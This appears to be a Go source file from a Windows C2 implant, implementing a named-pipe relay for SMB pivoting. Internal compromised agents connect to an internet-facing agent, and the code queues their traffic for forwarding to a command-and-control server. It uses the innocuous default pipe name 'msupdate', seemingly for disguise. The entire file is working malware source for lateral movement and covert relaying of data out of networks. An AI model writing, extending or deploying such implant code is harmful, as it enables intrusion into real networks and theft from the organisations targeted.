//go:build windows

package implant

import (
	"fmt"
	"sync"
	"time"

	"golang.org/x/sys/windows"
)

const (
	pipePrefix      = `\\.\pipe\`
	pipeTimeout     = 30 * time.Second
	pipeBufferSize  = 65536
	defaultPipeName = "msupdate"
)

// PipeRelay manages a Win32 named pipe relay for SMB pivoting.
// An edge agent (internet-facing) runs this relay; internal agents
// connect via \\edge-host\pipe\<name> and their traffic is queued
// for forwarding to the C2 server on the next HTTP check-in.
type PipeRelay struct {
	pipeName string
	mu       sync.Mutex
	inbound  [][]byte
	running  bool
	stop     chan struct{}
}

var activeRelay *PipeRelay
var relayMu sync.Mutex

// NewPipeRelay creates a new named pipe relay.
func NewPipeRelay(pipeName string) *PipeRelay {
	if pipeName == "" {
		pipeName = defaultPipeName
	}
	return &PipeRelay{
		pipeName: pipeName,
		stop:     make(chan struct{}),
	}
}

// StartPipeRelay starts the named pipe relay on this agent.
func StartPipeRelay(pipeName string) ([]byte, error) {
	relayMu.Lock()
	defer relayMu.Unlock()

	if activeRelay != nil && activeRelay.running {
		return []byte(fmt.Sprintf("[!] Relay already running on pipe: %s%s", pipePrefix, activeRelay.pipeName)), nil
	}

	relay := NewPipeRelay(pipeName)
	relay.running = true
	activeRelay = relay

	go relay.listenLoop()

	hostname := getHostnameQuiet()
	return []byte(fmt.Sprintf("[+] SMB pipe relay started: %s%s\n[+] Internal agents connect via: \\\\%s\\pipe\\%s",
		pipePrefix, relay.pipeName, hostname, relay.pipeName)), nil
}

// StopPipeRelay stops the active named pipe relay.
func StopPipeRelay() ([]byte, error) {
	relayMu.Lock()
	defer relayMu.Unlock()

	if activeRelay == nil || !activeRelay.running {
		return []byte("[!] No relay is running"), nil
	}

	activeRelay.running = false
	close(activeRelay.stop)
	activeRelay = nil
	return []byte("[+] SMB pipe relay stopped"), nil
}

// listenLoop continuously creates pipe instances and accepts client connections.
func (r *PipeRelay) listenLoop() {
	fullName := pipePrefix + r.pipeName
	namePtr, err := windows.UTF16PtrFromString(fullName)
	if err != nil {
		return
	}

	for r.running {
		select {
		case <-r.stop:
			return
		default:
		}

		handle, err := windows.CreateNamedPipe(
			namePtr,
			windows.PIPE_ACCESS_DUPLEX,
			windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
			windows.PIPE_UNLIMITED_INSTANCES,
			pipeBufferSize,
			pipeBufferSize,
			0,
			nil,
		)
		if err != nil {
			time.Sleep(time.Second)
			continue
		}

		err = windows.ConnectNamedPipe(handle, nil)
		if err != nil && err != windows.ERROR_PIPE_CONNECTED {
			windows.CloseHandle(handle)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		go r.handleClient(handle)
	}
}

// handleClient reads data from a connected pipe client and queues it for C2 forwarding.
func (r *PipeRelay) handleClient(handle windows.Handle) {
	defer windows.DisconnectNamedPipe(handle)
	defer windows.CloseHandle(handle)

	buf := make([]byte, pipeBufferSize)
	var collected []byte
	deadline := time.Now().Add(pipeTimeout)

	for time.Now().Before(deadline) {
		var bytesRead uint32
		err := windows.ReadFile(handle, buf, &bytesRead, nil)
		if err != nil {
			break
		}
		if bytesRead == 0 {
			break
		}
		collected = append(collected, buf[:bytesRead]...)
		if bytesRead < uint32(len(buf)) {
			break
		}
	}

	if len(collected) > 0 {
		r.mu.Lock()
		r.inbound = append(r.inbound, collected)
		r.mu.Unlock()
	}
}

// GetPendingRelayData returns and clears queued data from internal agents.
func (r *PipeRelay) GetPendingRelayData() [][]byte {
	r.mu.Lock()
	defer r.mu.Unlock()
	data := r.inbound
	r.inbound = nil
	return data
}

// ListPivots returns information about the active relay.
func ListPivots() ([]byte, error) {
	relayMu.Lock()
	defer relayMu.Unlock()

	if activeRelay == nil || !activeRelay.running {
		return []byte("No active pivot relays"), nil
	}

	return []byte(fmt.Sprintf("Active Pivots:\n  SMB Pipe: %s%s\n  Status:   running",
		pipePrefix, activeRelay.pipeName)), nil
}

func getHostnameQuiet() string {
	info := CollectSysInfo()
	return info.Hostname
}

// ExecutePivotCommand handles pivot-related task arguments.
func ExecutePivotCommand(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte("Usage: pivot <start|stop|list> [pipe-name]"), nil
	}

	switch args[0] {
	case "start":
		name := defaultPipeName
		if len(args) > 1 {
			name = args[1]
		}
		return StartPipeRelay(name)
	case "stop":
		return StopPipeRelay()
	case "list":
		return ListPivots()
	default:
		return []byte("Unknown pivot command. Use: start, stop, list"), nil
	}
}
